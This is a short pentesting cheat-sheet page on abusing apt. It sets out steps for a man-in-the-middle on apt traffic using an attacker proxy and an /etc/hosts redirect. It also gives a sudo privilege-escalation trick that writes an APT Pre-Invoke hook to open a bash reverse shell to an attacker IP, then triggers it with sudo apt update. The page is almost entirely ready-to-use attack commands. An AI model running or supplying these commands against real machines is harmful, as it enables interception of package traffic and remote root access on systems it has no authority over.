---
title: "Apt"
date: 2024-7-4
tags: ["apt", "update", "privesc", "pre-invoke", "sudo"]
---

### MITM (Man-in-the-Middle)

#### 1. Add proxy path in target machine

<div>

```console
export http_proxy=http://<LOCAL_IP>:<LOCAL_PROXY_PORT>
```

</div>

#### 2. Start proxy in local machine

<div>

```console
# Tool
pip3 install --upgrade proxy.py
```

```console
# Start a proxy server
proxy --hostname 0.0.0.0 --port <LOCAL_PROXY_PORT>
```

</div>

#### 3. Redirect traffic to our server

<div>

```console
# Edit /etc/hosts
<LOCAL_IP> apt.update.example.com
```

</div>

<br>

---

### SUDO

<div>

```console
# Create a malicious config
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
```

```console
# Exploit
sudo apt update -y
```

</div>

<br>